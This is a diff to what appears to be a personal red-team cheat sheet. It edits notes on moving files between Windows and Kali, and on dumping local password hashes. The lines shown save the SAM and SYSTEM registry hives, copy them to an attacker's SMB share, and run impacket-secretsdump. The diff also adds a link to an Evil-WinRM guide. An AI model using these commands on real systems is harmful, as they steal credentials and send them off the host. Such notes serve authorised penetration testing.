@@ -47,8 +47,11 @@ https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/
 KALI files transfert
 ---
 ```
+# Windows <- Kali
 python -m http.server
 http://IP:8000
+
+# Windows -> Kali
 impacket-smbserver -smb2support test .
 copy sam.save \\kali\test\sam.save
 copy system.save \\kali\test\system.save
@@ -110,8 +113,13 @@ SAM dump
 ```
 reg.exe save hklm\sam sam.save
 reg.exe save hklm\system system.save
-secretsdump.py -sam sam.save -system system.save LOCAL
+impacket-secretsdump -sam sam.save -system system.save LOCAL
 ```
+
+Evil-WinRM
+---
+https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/
+
 
 Kerberos
 ---
